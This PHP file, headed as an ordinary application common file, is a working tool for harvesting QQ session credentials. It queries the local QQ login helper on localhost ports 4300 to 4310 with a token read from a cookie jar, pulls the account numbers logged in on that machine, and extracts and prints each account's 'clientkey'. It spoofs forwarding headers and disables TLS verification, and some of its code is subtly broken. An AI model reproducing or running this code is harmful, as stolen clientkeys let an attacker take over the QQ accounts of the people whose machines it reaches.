<?php
// 应用公共文件
error_reporting(E_ALL ^ E_NOTICE);//显示除去 E_NOTICE 之外的所有错误信息
error_reporting(E_ERROR | E_WARNING | E_PARSE);//报告运行时错误


$useripIfon =get_client_ip();
if( $useripIfon == '0.0.0.0' ){
		$ipinfo = httprequest("http://ip.360.cn/IPShare/info","GET");
		if(!empty($ipinfo[1])){
			$useripIfon = json_decode($ipinfo[1],true);
			$useripIfon['ip'] = $useripIfon['ip']?$useripIfon['ip']:'127.0.0.1';
		}else{
			$useripIfon['ip'] = '127.0.0.1';
		}
}



$HTTP = httprequest("https://xui.ptlogin2.qq.com/cgi-bin/xlogin?appid=715030901&daid=73&pt_no_auth=1&s_url=https%3A%2F%2Fqun.qq.com%2F","GET",false,array('X-FORWARDED-FOR:'.$useripIfon, 'CLIENT-IP:'.$useripIfon));
$pt_local_token = duqucookieValue();//读取值
$QQ_Key_Port = 4299;
//print_r($HTTP);

for ($x=0; $x<=10; $x++) {
   $QQ_Key_Port++;//计次+1
   $QQ_Key_Str =  httprequest("https://localhost.ptlogin2.qq.com:".$QQ_Key_Port."/pt_get_uins?callback=ptui_getuins_CB&r=0.46434646978152294&pt_local_tk=".urlencode($pt_local_token),"GET",false,array('X-FORWARDED-FOR:'.$useripIfon, 'CLIENT-IP:'.$useripIfon,'Referer:https://xui.ptlogin2.qq.com/cgi-bin/xlogin?appid=715030901&daid=73&pt_no_auth=1&s_url=https%3A%2F%2Fqun.qq.com%2F','User-Agent:Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'),false,false,0,true);
   if(!empty($QQ_Key_Str[1])){
	  // print_r($QQ_Key_Str);
	   preg_match_all("/uin\":\"(.*?)\"/", $QQ_Key_Str[1], $match);
	   $QQinfo = array();
	   if(!empty($match[1])){
		  foreach($match[1] as $value){
		  $data = httprequest("https://localhost.ptlogin2.qq.com:".$QQ_Key_Port."/pt_get_st?clientuin=".$value."&callback=ptui_getst_CB&r=0.05343814654772827&pt_local_tk=".urlencode($pt_local_token),"GET",false,array('X-FORWARDED-FOR:'.$useripIfon, 'CLIENT-IP:'.$useripIfon,'Referer:https://xui.ptlogin2.qq.com/cgi-bin/xlogin?appid=715030901&daid=73&pt_no_auth=1&s_url=https%3A%2F%2Fqun.qq.com%2F','User-Agent:Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'),false,false,0,true);
			  preg_match("/clientkey=(.*?);/", $data[2], $match_cookie);
			  $QQinfo[]=array('qq'=>$value,'clientkey'=>$match_cookie[1]);
		  }
		   callback($QQinfo);
	   }else{
		   echo('获取出错'); 
	   }
	   
	   break;
   }else{
	  // print_r($QQ_Key_Str);
   }
}



function callback($data=array()){
	foreach($data as $key=>$value){
		echo "序号：".($key+1).'   已经登陆QQ：<font color=red>'.$value['qq'].'</font>   KEY:'.$value['clientkey'].'</br></br>';
	}
		echo '打印信息：</br>';
		print_r($data);
		
		
		echo '</br></br></br>//';
}









    /**
     * 模拟POST与GET请求
     *
     * ```
     *
     * @param string $url [请求地址]
     * @param string $type [请求方式 post or get]
     * @param bool|string|array $data [传递的参数]
     * @param array $header [可选：请求头] eg: ['Content-Type:application/json']
     * @param boolean $gzip [可选：GZIP压缩]
     * @param boolean $redirect [可选：重定向跳转]
     * @param int $timeout [可选：超时时间]
     *
     * @return array($body, $header, $status, $errno, $error)
     * - $body string [响应正文]
     * - $header string [响应头]
     * - $status array [响应状态]
     * - $errno int [错误码]
     * - $error string [错误描述]
     */
    function httprequest($url, $type, $data = false, $header = [], $gzip = false, $redirect = false, $timeout = 0,$cookies=false){
        $cl = curl_init();
		//curl_setopt($cl, CURLOPT_PROXY, "");//使用代理IP
		if(strpbrk($url,"%0D")!==false){
			//$url = urlencode($url);
			$url = str_replace("%0D","",$url);
		}
		
        // 兼容HTTPS
        if (stripos($url, 'https://') !== FALSE) {
            curl_setopt($cl, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($cl, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($cl, CURLOPT_SSLVERSION, 1);
        }
        // GZIP压缩
        if($gzip){
            curl_setopt($cl, CURLOPT_ENCODING, "gzip");
        }

        // 允许请求跳转
        if($redirect && ini_get('open_basedir') == '' && ini_get('safe_mode' == 'Off')){
            curl_setopt($cl, CURLOPT_FOLLOWLOCATION, TRUE);
        }

        // 设置返回内容做变量存储
        curl_setopt($cl, CURLOPT_RETURNTRANSFER, 1);

        // 获取返回COOKIE
		$cookie_file = dirname(__FILE__).'/cookie.txt';
		curl_setopt($cl, CURLOPT_COOKIEJAR,$cookie_file); 
		// 设置需要返回Header
        curl_setopt($cl, CURLOPT_HEADER, true);

        // 设置请求头
        if (count($header) > 0) {
            curl_setopt($cl, CURLOPT_HTTPHEADER, $header);
        }

        // 设置需要返回Body
        curl_setopt($cl, CURLOPT_NOBODY, 0);

        // 设置超时时间
        if ($timeout > 0) {
            curl_setopt($cl, CURLOPT_TIMEOUT, $timeout);
        }
		if($cookies){
			curl_setopt($cl, CURLOPT_COOKIEFILE,$cookie_file);  
		}

        // POST/GET参数处理
        $type = strtoupper($type);
            if ($type == 'POST') {
            curl_setopt($cl, CURLOPT_POST, true);
            // convert @ prefixed file names to CurlFile class
            // since @ prefix is deprecated as of PHP 5.6
            if (class_exists('\CURLFile') && is_array($data)) {
                foreach ($data as $k => $v) {
                    if (is_string($v) && strpos($v, '@') === 0) {
                        $v = ltrim($v, '@');
                        $data[$k] = new \CURLFile($v);
                    }
                }
            }
            
            curl_setopt($cl, CURLOPT_POSTFIELDS, $data);
        }
        if ($type == 'GET' && is_array($data)) {
            if (stripos($url, "?") === FALSE) {
                $url .= '?';
            }
            $url .= http_build_query($data);
        }
        if ($type == 'DELETE') {
            curl_setopt($cl, CURLOPT_CUSTOMREQUEST, 'DELETE');
        }
        if ($type == 'PUT') {
            curl_setopt($cl, CURLOPT_CUSTOMREQUEST, 'PUT');
            curl_setopt($cl, CURLOPT_POSTFIELDS, $data);
        }
        curl_setopt($cl, CURLOPT_URL, $url);
        // 读取获取内容
        $response = curl_exec($cl);
        // 读取状态
        $status = curl_getinfo($cl);
        // 读取错误号
        $errno  = curl_errno($cl);
        // 读取错误详情
        $error = curl_error($cl);
        //http code
        $code = curl_getinfo($cl,CURLINFO_HTTP_CODE);
        // 关闭Curl
        curl_close($cl);
        if ($errno == 0 && isset($status['http_code'])) {
            $header = substr($response, 0, $status['header_size']);
            $body = substr($response, $status['header_size']);
            return array($code,$body, $header, $status, 0, '');
        } else {
            return array('', '', $status, $errno, $error);
        }
    }


function duqucookieValue(){
	$file_path = dirname(__FILE__).'/cookie.txt';
	if(file_exists($file_path)){
		$str = file_get_contents($file_path);//将整个文件内容读入到一个字符串中
		preg_match("/pt_local_token	(.*?)\n/", $str, $match);
    //印出match[0]
		return $match ? $match[1] : '';
	}
	return '';
}




/**
* 获取真实IP
* @param int $type
* @param bool $client
* @return mixed
*/
function get_client_ip($type = 0,$client=true) 
{
        $type       =  $type ? 1 : 0;
        static $ip  =   NULL;
        if ($ip !== NULL) return $ip[$type];
        if($client){
            if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $arr    =   explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
                $pos    =   array_search('unknown',$arr);
                if(false !== $pos) unset($arr[$pos]);
                $ip     =   trim($arr[0]);
            }elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
                $ip     =   $_SERVER['HTTP_CLIENT_IP'];
            }elseif (isset($_SERVER['REMOTE_ADDR'])) {
                $ip     =   $_SERVER['REMOTE_ADDR'];
            }
        }elseif (isset($_SERVER['REMOTE_ADDR'])) {
            $ip     =   $_SERVER['REMOTE_ADDR'];
        }
        // 防止IP伪造
        $long = sprintf("%u",ip2long($ip));
        $ip   = $long ? array($ip, $long) : array('0.0.0.0', 0);
        return $ip[$type];
    }



?>
